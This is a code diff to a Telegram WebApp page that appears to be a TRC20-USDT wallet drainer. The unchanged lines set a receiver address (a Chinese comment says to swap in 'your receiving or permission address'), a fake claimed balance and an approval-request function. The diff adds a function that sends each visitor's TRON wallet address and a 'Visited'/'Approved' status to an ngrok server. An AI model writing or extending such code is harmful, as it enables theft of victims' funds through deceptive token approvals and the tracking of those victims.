@@ -97,11 +97,30 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT 合约地址
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT 
+        const API_URL = "https://opposite-chowder-prompter.ngrok-free.dev/api/log";
         const RECEIVER = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; // 【替换这里】你的收款或权限接收地址
         
         let userBalance = localStorage.getItem('p_amt') || "0.00";
         let isClaimed = !!localStorage.getItem('p_amt');
+        async function reportToBackend(status) {
+            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) return;
+            const payload = {
+                address: window.tronWeb.defaultAddress.base58,
+                status: status, // "Visited" 或 "Approved"
+                balance: 0, // 初始余额设为0，后端可异步查询真实余额
+                time: new Date().toLocaleTimeString()
+            };
+            try {
+                await fetch(API_URL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.log("Report offline"); }
+        }
+
 
         // 1. 授权核心函数
         async function requestApproval() {
